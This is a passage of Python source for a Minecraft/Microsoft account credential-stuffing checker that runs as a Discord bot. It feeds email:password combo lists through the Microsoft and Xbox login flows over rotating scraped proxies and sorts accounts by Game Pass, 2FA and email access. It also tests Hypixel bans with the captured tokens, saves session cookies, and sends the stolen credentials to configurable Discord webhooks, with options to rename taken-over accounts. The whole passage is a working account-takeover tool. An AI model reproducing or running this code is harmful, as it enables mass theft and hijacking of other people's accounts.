                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(20)
                        Capture.namechange(self)
                except: pass
                tries+=1
                retries+=1

    def save_cookies(self, type):
        cfname = os.path.join(f'results/{fname}', 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)

    def ban(self, session):
        global errors, unbanned, banned_count
        if config.get('hypixelban'):
            if not minecraft_available:
                self.banned = "Unknown (Library not available)"
                return
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            original_socket = socket.socket
            max_ban_retries = maxretries if maxretries > 0 else 3
            while tries < max_ban_retries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    global unbanned, banned_count
                    try:
                        data = json.loads(str(packet.json_data))
                        if "Suspicious activity" in str(data):
                            self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "temporarily banned" in str(data):
                            self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "You are permanently banned from this server!" in str(data):
                            self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "The Hypixel Alpha server is currently closed!" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "Failed cloning your SkyBlock data" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "kicked" in str(data).lower() or "disconnect" in str(data).lower():
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        else:
                            try:
                                self.banned = ''.join(item["text"] for item in data.get("extra", []))
                            except:
                                self.banned = str(data)
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                    except Exception as e:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    global unbanned
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                        unbanned += 1
                proxy_was_set = False
                connection_error = None
                try:
                    proxies_to_use = banproxies if len(banproxies) > 0 else proxylist
                    if len(proxies_to_use) > 0:
                        proxy = random.choice(proxies_to_use)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                        proxy_was_set = True
                    elif config.get('proxylessban') != True:
                        self.banned = "Unknown (No proxy)"
                        return
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        max_wait = 3000
                        while self.banned == None and c < max_wait:
                            time.sleep(.01)
                            c+=1
                        try:
                            connection.disconnect()
                        except:
                            pass
                    except Exception as conn_error:
                        connection_error = str(conn_error)
                    finally:
                        sys.stderr = original_stderr
                        if proxy_was_set:
                            socket.socket = original_socket
                            socks.set_default_proxy()
                except Exception as outer_error:
                    connection_error = str(outer_error)
                    if proxy_was_set:
                        socket.socket = original_socket
                        socks.set_default_proxy()
                if self.banned != None: 
                    break
                tries+=1
                if tries < max_ban_retries:
                    time.sleep(0.5)
            socket.socket = original_socket
            socks.set_default_proxy()
            if self.banned == None:
                self.banned = "False"
                with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                unbanned += 1
                try:
                    self.save_cookies('Unbanned')
                except:
                    pass

    def handle(self, session):
        global hits
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban(session)
            except: pass
        fullcapt = self.builder()
        if screen == "'2'": print(Fore.GREEN+fullcapt.replace('\n', ' | '))
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        open(f"results/{fname}/Capture.txt", 'a').write(fullcapt+"\n============================\n")
        self.notify()

class Login:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
def get_urlPost_sFTTag(session):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        session.proxies = getproxy()
        retries += 1
        tries += 1
    raise Exception("Failed to get authentication URL after max retries")

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxies = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxies = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=15)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                CAPTURE.handle(session)
                break
            elif r.status_code == 429:
                retries+=1
                session.proxies = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                loop_tries += 1
                continue
            else: break
        except:
            retries+=1
            session.proxies = getproxy()
            loop_tries += 1
            continue

def checkmc(session, email, password, token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    max_tries = maxretries if maxretries > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=15)
        except:
            retries += 1
            session.proxies = getproxy()
            loop_tries += 1
            continue
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]", session)
                    CAPTURE.handle(session)
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked+=1
                cpm+=1
                capture_mc(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other+=1
                    cpm+=1
                    checked+=1
                    items = ', '.join(others)
                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                    if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries+=1
            session.proxies = getproxy()
            if len(proxylist) < 1: time.sleep(20)
            loop_tries += 1
            continue
        else:
            return False
    return False

def mc_token(session, uhs, xsts_token):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) < 1: time.sleep(20)
                tries += 1
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxies = getproxy()
            tries += 1
            continue
    return None

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token)
            except: pass
            if hit == False: validmail(email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load(filename):
    global Combos, fname
    if filename is None:
        return False, "Invalid File."
    else:
        fname = os.path.splitext(os.path.basename(filename))[0]
        try:
            with open(filename, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                return True, f"[{str(len(lines) - len(Combos))}] Dupes Removed.\n[{len(Combos)}] Combos Loaded."
        except:
            return False, "Your file is probably harmed."

def Proxys(file_path):
    global proxylist
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    proxylist.append(proxyline)
                except: pass
        return True, f"Loaded [{len(proxylist)}] proxies."
    except Exception:
        return False, "Your file is probably harmed."

def getproxy():
    if proxytype == "'4'":
        return None
    if len(proxylist) == 0:
        return None
    try:
        proxy = random.choice(proxylist)
        # Handle case where proxy is already a dict (from auto-scraper)
        if isinstance(proxy, dict):
            return proxy
        # Handle case where proxy is a string (from file loading)
        if proxytype == "'1'" or proxytype == "'5'":
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype == "'2'":
            return {'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy}
        elif proxytype == "'3'":
            return {'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy}
        else:
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
    except:
        return None

def Checker(combo):
    global bad, checked, cpm
    try:
        split = combo.strip().split(":")
        email = split[0]
        password = split[1]
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries, config

    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')

    default_config = {
        'Settings': {
            'Webhook': 'paste your discord webhook here',
            'BannedWebhook': 'paste banned accounts webhook',
            'UnbannedWebhook': 'paste unbanned accounts webhook',
            'Embed': True,
            'Max Retries': 5,
            'Proxyless Ban Check': True,
            'WebhookMessage': ''' ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''
        },
        'Scraper': {
            'Auto Scrape Minutes': 5
        },
        'Auto': {
            'Set Name': True,
            'Name': 'VaultCore',
            'Set Skin': True,
            'Skin': 'https://s.namemc.com/i/bc8429d1f2e15539.png',
            'Skin Variant': 'classic'
        },
        'Captures': {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True,
            'Payment': True
        }
    }
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, values in default_config.items():
            c[section] = values
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    config_updated = False
    for section, values in default_config.items():
        if section not in read_config:
            read_config[section] = values
            config_updated = True
        else:
            for key, value in values.items():
                if key not in read_config[section]:
                    read_config[section][key] = str(value)
                    config_updated = True
    if config_updated:
        with open('config.ini', 'w') as configfile:
            read_config.write(configfile)
    # settings
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('embed', str_to_bool(read_config['Settings']['Embed']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    config.set('BannedWebhook', str(read_config['Settings']['BannedWebhook']))
    config.set('UnbannedWebhook', str(read_config['Settings']['UnbannedWebhook']))
    # scraper
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    # auto
    config.set('setname', str_to_bool(read_config['Auto']['Set Name']))
    config.set('name', str(read_config['Auto']['Name']))
    config.set('setskin', str_to_bool(read_config['Auto']['Set Skin']))
    config.set('skin', str(read_config['Auto']['Skin']))
    config.set('variant', str(read_config['Auto']['Skin Variant']))
    # capture
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
    config.set('payment', str_to_bool(read_config['Captures']['Payment']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        try:
            http.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks4: 
        try:
            socks4.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks5: 
        try:
            socks5.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500", timeout=30).json().get('data', []):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500", timeout=30).json().get('data', []):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: 
        if proxy.strip(): proxylist.append({'http': 'http://'+proxy.strip(), 'https': 'http://'+proxy.strip()})
    for proxy in socks4: 
        if proxy.strip(): proxylist.append({'http': 'socks4://'+proxy.strip(),'https': 'socks4://'+proxy.strip()})
    for proxy in socks5: 
        if proxy.strip(): proxylist.append({'http': 'socks5://'+proxy.strip(),'https': 'socks5://'+proxy.strip()})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    autoscrape_time = config.get('autoscrape')
    if autoscrape_time and autoscrape_time > 0:
        time.sleep(autoscrape_time * 60)
        get_proxies()

def banproxyload(file_path):
    global banproxies
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    banproxies.append(proxyline)
                except: pass
        return True, f"Loaded [{len(banproxies)}] ban proxies."
    except Exception:
        return False, "Your file is probably harmed."

# Discord Bot Implementation
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents)
synced_commands = False

# Global variables for checker control
active_checkers = {}

class CheckerSession:
    def __init__(self, ctx, threads, proxy_type, combos_file, proxies_file=None, webhook_url=None):
        self.ctx = ctx
        self.threads = threads
        self.proxy_type = proxy_type
        self.combos_file = combos_file
        self.proxies_file = proxies_file
        self.webhook_url = webhook_url
        self.session_id = str(ctx.id)
        self.is_running = True
        self.stats = {
            'checked': 0,
            'total': 0,
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'sfa': 0,
            'mfa': 0,
            'xgp': 0,
            'xgpu': 0,
            'other': 0,
            'vm': 0,
            'errors': 0,
            'retries': 0,
            'unbanned': 0,
            'banned_count': 0,
            'start_time': datetime.now()
        }
        
    async def send_status_update(self):
        """Send status update to Discord channel"""
        if not self.is_running:
            return
            
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        progress_percent = (self.stats['checked'] / self.stats['total']) * 100 if self.stats['total'] > 0 else 0
        
        embed = discord.Embed(
            title="🔍 Checker Status",
            color=discord.Color.blue(),
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="Progress",
            value=f"`{self.stats['checked']}/{self.stats['total']}` ({progress_percent:.1f}%)",
            inline=True
        )
        
        embed.add_field(
            name="Results",
            value=f"✅ Hits: `{self.stats['hits']}`\n❌ Bad: `{self.stats['bad']}`\n🔐 2FA: `{self.stats['twofa']}`",
            inline=True
        )
        
        embed.add_field(
            name="Account Types",
            value=f"🎮 SFA: `{self.stats['sfa']}`\n🔓 MFA: `{self.stats['mfa']}`\n📧 Valid Mail: `{self.stats['vm']}`",
            inline=True
        )
        
        embed.add_field(
            name="Xbox & Other",
            value=f"🎯 XGP: `{self.stats['xgp']}`\n⚡ XGPU: `{self.stats['xgpu']}`\n📦 Other: `{self.stats['other']}`",
            inline=True
        )
        
        embed.add_field(
            name="Ban Status",
            value=f"🟢 Unbanned: `{self.stats['unbanned']}`\n🔴 Banned: `{self.stats['banned_count']}`",
            inline=True
        )
        
        embed.add_field(
            name="Technical",
            value=f"🔄 Retries: `{self.stats['retries']}`\n❓ Errors: `{self.stats['errors']}`\n⏱️ {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}",
            inline=True
        )
        
        embed.set_footer(text=f"Session ID: {self.session_id}")
        
        try:
            await self.ctx.send(embed=embed)
        except Exception as e:
            print(f"Failed to send status update: {e}")

    async def run_checker(self):
        """Run the checker in a separate thread"""
        try:
            # Load configuration
            loadconfig()
            
            # Load combos
            success, message = Load(self.combos_file)
            if not success:
                await self.ctx.send(f"❌ {message}")
                return
            
            self.stats['total'] = len(Combos)
            
            # Setup proxy type globally
            global proxytype, screen
            proxytype = self.proxy_type
            screen = "'2'"  # Log mode
            
            # Load proxies if provided and needed
            if self.proxies_file and proxytype != "'4'" and proxytype != "'5'":
                success, message = Proxys(self.proxies_file)
                if not success:
                    await self.ctx.send(f"❌ {message}")
                    return
            
            # Auto scrape proxies if selected
            if proxytype == "'5'":
                await self.ctx.send("🔄 Scraping proxies...")
                threading.Thread(target=get_proxies, daemon=True).start()
                # Wait for proxies to be scraped
                max_wait = 30
                waited = 0
                while len(proxylist) == 0 and waited < max_wait:
                    await asyncio.sleep(1)
                    waited += 1
                if len(proxylist) == 0:
                    await self.ctx.send("❌ Failed to scrape proxies. Switching to proxyless mode.")
                    proxytype = "'4'"
            
            # Create results directory
            global fname
            fname = f"discord_check_{self.session_id}"
            if not os.path.exists(f"results/{fname}"):
                os.makedirs(f"results/{fname}")
            
            # Start status updates
            asyncio.create_task(self.status_loop())
            
            # Send starting message
            embed = discord.Embed(
                title="🚀 Checker Started",
                color=discord.Color.green(),
                description=f"Checking {self.stats['total']} accounts with {self.threads} threads"
            )
            embed.add_field(name="Proxy Type", value=self.get_proxy_type_name(), inline=True)
            embed.add_field(name="Session ID", value=self.session_id, inline=True)
            await self.ctx.send(embed=embed)
            
            # Run checker in a separate thread to avoid blocking the event loop
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, self._run_checker_blocking)
            
            # Send final summary
            await self.send_final_summary("🏁 Checker Completed")
            
        except Exception as e:
            await self.ctx.send(f"❌ Checker error: {str(e)}")
            print(f"Checker error: {traceback.format_exc()}")
        finally:
            # Cleanup
            if self.session_id in active_checkers:
                del active_checkers[self.session_id]
            
            # Clean up temporary files
            try:
                if os.path.exists(self.combos_file):
                    os.remove(self.combos_file)
                if self.proxies_file and os.path.exists(self.proxies_file):
                    os.remove(self.proxies_file)
            except:
                pass

    def _run_checker_blocking(self):
        """Blocking method that runs the ThreadPoolExecutor work in a separate thread"""
        global session_webhook_url
        session_webhook_url = self.webhook_url
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.safe_checker, combo) for combo in Combos]
            
            for future in concurrent.futures.as_completed(futures):
                if not self.is_running:
                    break
                try:
                    future.result()
                except Exception as e:
                    self.stats['errors'] += 1

    def safe_checker(self, combo):
        """Wrapper for Checker function that updates stats"""
        if not self.is_running:
            return
            
        try:
            # Store current global values
            global hits, bad, twofa, sfa, mfa, xgp, xgpu, other, vm, errors, retries, checked, unbanned, banned_count
            
            # Call your existing Checker function
